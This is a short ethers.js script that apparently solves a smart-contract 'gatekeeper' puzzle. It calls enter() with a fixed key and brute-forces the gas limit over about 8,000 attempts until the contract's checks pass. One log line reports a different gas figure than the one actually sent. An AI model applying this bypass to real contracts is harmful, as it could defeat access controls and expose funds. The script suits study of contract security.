





/*

*************************************************************************
*                                                                       *
*                                                                       *                                
*    Do not use Javascript in this case it completely Waste of Time     *         
*    Use solidity to save time & gas                                    *
*                                                                       *
*                                                                       *
 ************************************************************************

*/





let { ethers } = require('ethers');
let ABI = require('./ABI.json');

let PRIVATE_KEY = ""
let network = ""
let Contract_address = "0x67815c47AE5FaFFFB9fe6244A2f9eD4093472c14";

let provider = new ethers.providers.JsonRpcProvider(network);                        // read from blockchain
let signer = new ethers.Wallet(PRIVATE_KEY, provider);                              //  write on blockchain
let i = new ethers.Contract(Contract_address,ABI,signer);                          // contract_instance

let main = async()=>
{
    let attack = async () => 
    {
        for (let k = 1; k <= 8191; k++) 
        {
          try 
          {
            let gasLimit = 81910 + k;
            let tx = await i.enter("0x000a000000008d4B", { gasLimit });
            await tx.wait();
            return true;
          } catch (error) 
          {
            console.log(`Attempt with gasLimit ${81910*10 + k} failed:`);//error.message
          }
        }
        return false;
      };
    
      let success = await attack();
      if (success) 
      {
        console.log('Attack successful!');
      } 
      else 
      {
        console.log('Attack failed');
      }
}

main().catch((error) => 
{
    console.log("Error aagya ===")
    console.error(error);
});